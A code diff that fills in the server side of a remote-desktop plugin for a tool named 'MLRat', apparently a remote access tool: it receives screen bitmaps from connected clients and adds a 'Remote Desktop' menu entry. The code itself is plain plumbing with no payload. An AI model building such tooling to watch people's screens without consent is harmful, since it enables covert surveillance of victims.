@@ -5,27 +5,38 @@ using System.Text;
 using System.Threading.Tasks;
 using MLRat.Server;
 using ServerPlugin.InterfaceHandle;
+using System.Drawing;
 
 public class MLManagement_Server : IServerPlugin 
 {
     public void OnClientConnect(IClient client)
     {
-        throw new NotImplementedException();
+        RemoteDesktop.newClient(client);
     }
 
     public void OnClientDisconnect(IClient client)
     {
-        throw new NotImplementedException();
+        RemoteDesktop.ClientDisconnected(client);
     }
 
     public void OnDataRetrieved(IClient client, object[] data)
     {
-        throw new NotImplementedException();
+        string command = (string)data[0];
+        if (command == "remotedesktop")
+        {
+            Bitmap sc = (Bitmap) data[1];
+            RemoteDesktop.NewFrame(client, sc);
+        }
     }
 
-    public void OnPluginLoad()
+    public void OnPluginLoad(IServerUIHandler UIHost)
     {
-        throw new NotImplementedException();
+        UIHost.AddContext(new MLRatContextEntry()
+        {
+            Text = "Remote Desktop",
+            OnClick = RemoteDesktop.ContextCallback
+        });
+        
     }
 
     public ServerPlugin.InterfaceHandle.MLPluginInfomation PluginInfomation
@@ -39,4 +50,7 @@ public class MLManagement_Server : IServerPlugin
             return _p;
         }
     }
+
+
+    
 }
